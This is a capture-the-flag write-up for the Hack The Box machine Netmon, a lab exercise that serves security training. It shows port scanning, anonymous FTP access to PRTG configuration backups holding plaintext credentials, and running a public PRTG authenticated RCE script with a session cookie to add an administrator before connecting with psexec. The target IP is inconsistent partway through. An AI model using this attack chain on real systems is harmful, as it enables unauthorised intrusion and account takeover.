# HTB Netmon

**Machine Information**

	IP : 10.10.10.98
	OS : Windows

### Reconnaissance

**Rustscan**

Start by running a port scan using `rustscan`.

```
rustscan -a 10.10.10.98 -- -sC -sV
```

```
PORT      STATE SERVICE      REASON  VERSION
21/tcp    open  ftp          syn-ack Microsoft ftpd
| ftp-syst:
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 02-03-19  12:18AM                 1024 .rnd
| 02-25-19  10:15PM       <DIR>          inetpub
| 07-16-16  09:18AM       <DIR>          PerfLogs
| 02-25-19  10:56PM       <DIR>          Program Files
| 02-03-19  12:28AM       <DIR>          Program Files (x86)
| 02-03-19  08:08AM       <DIR>          Users
|_11-10-23  10:20AM       <DIR>          Windows
80/tcp    open  http         syn-ack Indy httpd 18.1.37.13946 (Paessler PRTG bandwidth monitor)
|_http-favicon: Unknown favicon MD5: 36B3EF286FA4BEFBB797A0966B456479
|_http-server-header: PRTG/18.1.37.13946
|_http-trane-info: Problem with XML parsing of /evox/about
| http-title: Welcome | PRTG Network Monitor (NETMON)
|_Requested resource was /index.htm
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
135/tcp   open  msrpc        syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn  syn-ack Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds syn-ack Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
5985/tcp  open  http         syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http         syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc        syn-ack Microsoft Windows RPC
49665/tcp open  msrpc        syn-ack Microsoft Windows RPC
49666/tcp open  msrpc        syn-ack Microsoft Windows RPC
49667/tcp open  msrpc        syn-ack Microsoft Windows RPC
49668/tcp open  msrpc        syn-ack Microsoft Windows RPC
49669/tcp open  msrpc        syn-ack Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
```

### Getting a Foothold

**PRTG Bandwidth Monitor**

Looking at the Nmap results we can see a version number for "Paessler PRTG bandwidth monitor". Checking `searchsploit` we can see a potential Authenticated RCE.

```
searchsploit prtg
```

```
PRTG Network Monitor 18.2.38 - (Authenticated) Remote Code Execution
```

**FTP**

We don't have credentials yet but the FTP server does not require any. Connect to the FTP server as an anonymous user.

```
ftp 10.10.10.152
```

Exploring the files we can retrieve the `user.txt` file from the following directory.

```
C:\Users\Public\Desktop\user.txt
```

### Privilege Escalation

After exploring the FTP server more we can find where the configuration files for "Paessler PRTG bandwidth monitor" are stored. Check the following directory.

```
C:\ProgramData\Paessler\PRTG Network Monitor
```

In this folder will be a `.dat`, `.old`, and `.old.bak` file to download. Investigating each of the files will find some unencrypted user credentials in `PRTG Configuration.old.bak`. We can attempt to login into the PRTG Network Monitor application, but it will fail.

**Remote Code Execution**

The password has a year in it and was found in a backup so enumerate the password to gain access. With credentials we can now try the authenticated RCE exploit from earlier. 
Reading the instructions we need to sign in and copy our authenticated cookie. Once we have that run the following command to create a new Administrator user on the target system.

```
./46527.sh -u http://10.10.10.152 -c "OCTOPUS1813713946=e0MyRjcwRjlBLUZERkYtNEZFOS04QjUxLUZGODkzQkQ1QzA3MH0%3D"
```

If this completes successfully we can connect to the target machine using `psexec`.

```
impacket-psexec pentest@10.10.10.152
```

Grab the flag.

```
type C:\Users\Administrator\Desktop\root.txt
```
